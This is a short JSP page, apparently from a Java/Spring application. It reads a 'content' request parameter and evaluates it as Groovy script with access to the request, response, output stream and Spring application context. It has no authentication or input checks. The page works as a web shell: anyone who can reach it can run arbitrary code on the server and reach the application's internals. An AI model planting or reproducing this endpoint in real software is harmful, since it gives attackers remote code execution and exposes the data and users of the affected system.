<%@page import="groovy.lang.GroovyShell"%>
<%@page import="org.springframework.web.context.support.WebApplicationContextUtils"%>
<%@page import="groovy.lang.Binding"%>
<%@page import="com.alibaba.common.lang.StringUtil"%>
<%@ page language="java" contentType="text/html; charset=GBK" pageEncoding="GBK"%>
<%
    String content = request.getParameter("content");
    if (StringUtil.isNotBlank(content)) {
        Binding binding = new Binding();
        binding.setVariable("out", out);
        binding.setVariable("request", request);
        binding.setVariable("response", response);
        binding.setVariable("context", WebApplicationContextUtils.getRequiredWebApplicationContext(pageContext.getServletContext()));
        GroovyShell gs = new GroovyShell(binding);
        gs.evaluate(content);
    } else {
        out.println("no Groovy Script!");
    }
%>